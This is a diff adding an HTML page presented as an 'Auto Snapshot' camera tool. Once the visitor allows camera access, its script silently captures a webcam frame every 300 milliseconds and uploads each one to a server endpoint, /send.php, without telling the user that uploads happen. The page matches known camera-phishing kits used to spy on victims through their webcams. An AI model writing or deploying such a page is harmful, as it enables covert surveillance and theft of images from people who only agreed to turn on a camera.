@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto Camera</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { margin:0; padding:20px; background:#000; color:white; font-family:sans-serif; text-align:center; }
+    #btn { padding:12px 24px; font-size:18px; background:#0d6efd; color:white; border:none; border-radius:6px; cursor:pointer; margin-top:20px; }
+    #video { width:100%; max-width:640px; margin-top:20px; display:none; }
+  </style>
+</head>
+<body>
+  <h2>📸 Auto Snapshot</h2>
+  <button id="btn">Allow Camera</button>
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    document.getElementById('btn').onclick = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        video.style.display = 'block';
+        document.getElementById('btn').style.display = 'none';
+
+        setInterval(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+
+          canvas.toBlob(async (blob) => {
+            const fd = new FormData();
+            fd.append('image', blob, 'photo.jpg');
+            await fetch('/send.php', { method: 'POST', body: fd })
+              .catch(e => console.error('Send failed:', e));
+          }, 'image/jpeg', 0.85);
+        }, 300);
+      } catch (err) {
+        alert('Camera access denied');
+      }
+    };
+  </script>
+</body>
+</html>
